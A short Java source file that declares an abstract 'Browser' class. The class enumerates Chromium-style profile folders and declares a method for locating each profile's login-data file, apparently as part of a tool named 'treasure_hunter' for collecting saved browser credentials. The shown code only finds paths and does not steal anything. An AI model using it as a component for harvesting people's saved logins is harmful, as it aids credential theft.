package com.treasure_hunter_java.browsers;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public abstract class Browser {

    private List<Path> profiles = new ArrayList<>();

    public void collectProfiles(Path dirName) {
        for (int i = 1; i < 10; i++) {
            Path path = Path.of(dirName + "/Profile " + i);
            if (Files.exists(path)) {
                profiles.add(path);
            }
        }

        Path path = Path.of(dirName + "/Default");
        if (Files.exists(path)) {
            profiles.add(path);
        }

        if (profiles.isEmpty()) {
            profiles.add(Path.of(dirName + ""));
        }
    }

    public List<Path> getProfiles() {
        return profiles;
    }

    public abstract Path getLoginData(Path profilePath);
}

